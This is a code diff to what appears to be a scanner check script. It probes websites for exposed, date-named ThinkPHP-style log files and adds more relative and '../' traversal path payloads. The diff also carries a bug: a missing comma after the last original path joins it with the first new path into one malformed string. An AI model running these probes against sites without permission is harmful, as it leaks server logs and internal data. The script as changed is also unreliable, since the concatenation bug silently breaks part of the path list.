@@ -6,10 +6,11 @@ from lib.utils.package import make_request_package
 
 headers = {
     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
-    'Accept': 'application/json, text/plain, */*',
-    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
-    'Accept-Encoding': 'gzip, deflate',
-    'Connection': 'close'
+    'Accept-Language': '*',
+    'Accept-Encoding': '*',
+    'Keep-Alive': '300',
+    'Connection': 'Keep-Alive',
+    'Cache-Control': 'max-age=0'
     }
 
 def check(url):
@@ -24,7 +25,7 @@ def check(url):
 
     # payload 
     filename = time.strftime("%Y%m/%d", time.localtime())
-    filename2 = time.strftime("%Y_%m_%d", time.localtime())
+    filename2 = time.strftime("%Y_%m_%d", time.localtime())[2:]
     payloads = [
             f"../../runtime/log/{filename}.log",
             f"../../Home/Temp/log/{filename}.log",
@@ -34,6 +35,10 @@ def check(url):
             f"../Home/Temp/log/{filename}.log",
             f"../runtime/index/log/{filename}.log",
             f"../runtime/admin/log/{filename}.log",
+            f"runtime/log/{filename}.log",
+            f"Home/Temp/log/{filename}.log",
+            f"runtime/index/log/{filename}.log",
+            f"runtime/admin/log/{filename}.log",
             f"../../Temp/Logs/{filename2}.log",
             f"../../Runtime/Logs/Home/{filename2}.log",
             f"../../Runtime/Logs/{filename2}.log",
@@ -50,6 +55,14 @@ def check(url):
             f"../Application/Runtime/Logs/Home/{filename2}.log",
             f"../Application/Runtime/Logs/Admin/{filename2}.log",
             f"../App/Runtime/Logs/Home/{filename2}.log"
+            f"Temp/Logs/{filename2}.log",
+            f"Runtime/Logs/Home/{filename2}.log",
+            f"Runtime/Logs/{filename2}.log",
+            f"Runtime/Logs/Common/{filename2}.log",
+            f"Application/Runtime/Logs/Common/{filename2}.log",
+            f"Application/Runtime/Logs/Home/{filename2}.log",
+            f"Application/Runtime/Logs/Admin/{filename2}.log",
+            f"App/Runtime/Logs/Home/{filename2}.log"
         ]
 
     try:
